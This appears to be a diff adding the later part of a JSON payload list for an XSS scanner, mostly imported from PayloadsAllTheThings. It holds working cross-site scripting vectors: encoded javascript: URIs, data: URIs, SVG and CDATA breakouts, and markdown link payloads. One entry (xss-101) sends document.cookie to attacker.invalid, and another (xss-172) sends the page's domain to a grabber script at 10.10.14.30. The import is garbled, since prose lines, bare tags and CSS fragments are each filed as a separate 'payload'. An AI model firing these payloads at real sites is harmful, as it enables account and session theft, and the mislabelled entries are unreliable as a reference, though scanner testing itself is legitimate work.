+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0090",
+    "payload": "We can encode the \"javascript:\" in Hex/Octal",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0091",
+    "payload": "\\x6A\\x61\\x76\\x61\\x73\\x63\\x72\\x69\\x70\\x74\\x3aalert(1)",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0092",
+    "payload": "\\u006A\\u0061\\u0076\\u0061\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u003aalert(1)",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0093",
+    "payload": "\\152\\141\\166\\141\\163\\143\\162\\151\\160\\164\\072alert(1)",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0094",
+    "payload": "We can use a 'newline character'",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0095",
+    "payload": "java%0ascript:alert(1)   - LF (\\n)",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0096",
+    "payload": "java%09script:alert(1)   - Horizontal tab (\\t)",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0097",
+    "payload": "java%0dscript:alert(1)   - CR (\\r)",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0098",
+    "payload": "Using the escape character",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0099",
+    "payload": "\\j\\av\\a\\s\\cr\\i\\pt\\:\\a\\l\\ert\\(1\\)",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0100",
+    "payload": "Using the newline and a comment //",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0101",
+    "payload": "javascript://%0Aalert(1)",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0102",
+    "payload": "javascript://anything%0D%0A%0D%0Awindow.alert(1)",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0103",
+    "payload": "data:text/html,<script>alert(0)</script>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0104",
+    "payload": "data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0105",
+    "payload": "<script src=\"data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==\"></script>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0106",
+    "payload": "vbscript:msgbox(\"XSS\")",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0107",
+    "payload": "<name>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0108",
+    "payload": "<value><![CDATA[<script>confirm(document.domain)</script>]]></value>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0109",
+    "payload": "</name>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0110",
+    "payload": "<html>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0111",
+    "payload": "<head></head>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0112",
+    "payload": "<body>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0113",
+    "payload": "<something:script xmlns:something=\"http://www.w3.org/1999/xhtml\">alert(1)</something:script>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0114",
+    "payload": "</body>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0115",
+    "payload": "</html>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0116",
+    "payload": "<?xml version=\"1.0\" standalone=\"no\"?>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0117",
+    "payload": "<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0118",
+    "payload": "<svg version=\"1.1\" baseProfile=\"full\" xmlns=\"http://www.w3.org/2000/svg\">",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0119",
+    "payload": "<polygon id=\"triangle\" points=\"0,0 0,50 50,0\" fill=\"#009900\" stroke=\"#004400\"/>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0120",
+    "payload": "<script type=\"text/javascript\">",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0121",
+    "payload": "alert(document.domain);",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0122",
+    "payload": "</svg>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0123",
+    "payload": "<svg version=\"1.1\" baseProfile=\"full\" width=\"100\" height=\"100\" xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert('svg attribut')\">",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0124",
+    "payload": "<polygon id=\"lightning\" points=\"0,100 50,25 50,75 100,0\" fill=\"#ff1919\" stroke=\"#ff0000\"/>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0125",
+    "payload": "<desc><script>alert('svg desc')</script></desc>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0126",
+    "payload": "<foreignObject><script>alert('svg foreignObject')</script></foreignObject>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0127",
+    "payload": "<foreignObject width=\"500\" height=\"500\">",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0128",
+    "payload": "<iframe xmlns=\"http://www.w3.org/1999/xhtml\" src=\"javascript:alert('svg foreignObject iframe');\" width=\"400\" height=\"250\"/>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0129",
+    "payload": "</foreignObject>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0130",
+    "payload": "<title><script>alert('svg title')</script></title>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0131",
+    "payload": "<animatetransform onbegin=\"alert('svg animatetransform onbegin')\"></animatetransform>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0132",
+    "payload": "alert('svg script');",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0133",
+    "payload": "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(document.domain)\"/>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0134",
+    "payload": "<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0135",
+    "payload": "<svg><foreignObject><![CDATA[</foreignObject><script>alert(2)</script>]]></svg>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0136",
+    "payload": "<svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0137",
+    "payload": "<svg width=\"200\" height=\"200\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0138",
+    "payload": "<image xlink:href=\"http://127.0.0.1:9999/red_lightning_xss_full.svg\" height=\"200\" width=\"200\"/>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0139",
+    "payload": "<use xlink:href=\"http://127.0.0.1:9999/red_lightning_xss_full.svg#lightning\"/>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0140",
+    "payload": "<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0141",
+    "payload": "<svg x=\"10\">",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0142",
+    "payload": "<rect x=\"10\" y=\"10\" height=\"100\" width=\"100\" style=\"fill: #002654\"/>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0143",
+    "payload": "<script type=\"text/javascript\">alert('sub-svg 1');</script>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0144",
+    "payload": "<svg x=\"200\">",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0145",
+    "payload": "<rect x=\"10\" y=\"10\" height=\"100\" width=\"100\" style=\"fill: #ED2939\"/>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0146",
+    "payload": "<script type=\"text/javascript\">alert('sub-svg 2');</script>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0147",
+    "payload": "[a](javascript:prompt(document.cookie))",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0148",
+    "payload": "[a](j a v a s c r i p t:prompt(document.cookie))",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0149",
+    "payload": "[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0150",
+    "payload": "[a](javascript:window.onerror=alert;throw%201)",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0151",
+    "payload": "<!DOCTYPE html>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0152",
+    "payload": "<head>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0153",
+    "payload": "<style>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0154",
+    "payload": "div  {",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0155",
+    "payload": "background-image: url(\"data:image/jpg;base64,<\\/style><svg/onload=alert(document.domain)>\");",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0156",
+    "payload": "background-color: #cccccc;",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0157",
+    "payload": "</style>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0158",
+    "payload": "</head>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0159",
+    "payload": "<div>lol</div>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0160",
+    "payload": "<input type=button value=\"Click Me\" id=\"btn\">",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0161",
+    "payload": "document.getElementById('btn').onclick = function(e){",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0162",
+    "payload": "window.poc = window.open('http://www.redacted.com/#login');",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0163",
+    "payload": "setTimeout(function(){",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0164",
+    "payload": "window.poc.postMessage(",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0165",
+    "payload": "\"sender\": \"accounts\",",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0166",
+    "payload": "\"url\": \"javascript:confirm('XSS')\",",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0167",
+    "payload": "'*'",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0168",
+    "payload": "}, 2000);",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0169",
+    "payload": "\"><script src=\"https://js.rip/<custom.name>\"></script>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0170",
+    "payload": "\"><script src=//<custom.subdomain>.xss.ht></script>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0171",
+    "payload": "<script>$.getScript(\"//<custom.subdomain>.xss.ht\")</script>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0172",
+    "payload": "<script>document.location='http://10.10.14.30:8080/XSS/grabber.php?c='+document.domain</script>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0173",
+    "payload": "ruby -run -ehttpd . -p8080",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-0174",
+    "payload": "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "xss payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "xss-001",
+    "payload": "<script>alert(1)</script>",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "Basic reflected XSS probe",
+    "expected_feature": "Payload reflected without proper encoding",
+    "source": "curated"
+  },
+  {
+    "id": "xss-002",
+    "payload": "\"'><img src=x onerror=alert(1)>",
+    "mode": "test",
+    "risk_level": "medium",
+    "enabled_by_default": true,
+    "purpose": "Attribute/context escape XSS probe",
+    "expected_feature": "Injected tag appears in response DOM/source",
+    "source": "curated"
+  },
+  {
+    "id": "xss-101",
+    "payload": "<svg/onload=fetch('https://attacker.invalid/'+document.cookie)>",
+    "mode": "attack",
+    "risk_level": "high",
+    "enabled_by_default": false,
+    "purpose": "High-impact data exfiltration behavior check",
+    "expected_feature": "Script execution and outbound request",
+    "source": "curated"
+  }
+]
